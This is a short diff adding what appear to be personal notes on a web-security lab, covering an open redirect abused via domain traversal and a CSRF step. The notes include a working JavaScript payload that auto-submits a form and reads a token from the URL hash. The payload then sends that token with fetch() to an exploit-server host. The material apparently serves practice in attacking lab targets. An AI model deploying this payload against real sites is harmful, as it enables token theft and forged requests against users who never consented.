@@ -1,0 +1,11 @@
+OPEN_REDIRECT
+> redirect url can only accept valid domains, but can traverse domain to open redirect to attackers domain
+csrf
+...
+if (window.location.hash) {
+    fetch("https://exploit-0a7500c903bc3561c06290cc01b700e5.exploit-server.net/TOKEN:"+window.location.hash.substring(1))
+    console.log(window.location.hash.substring(1))
+} else {
+    history.pushState('', '', '/');
+    document.forms[0].submit();
+}
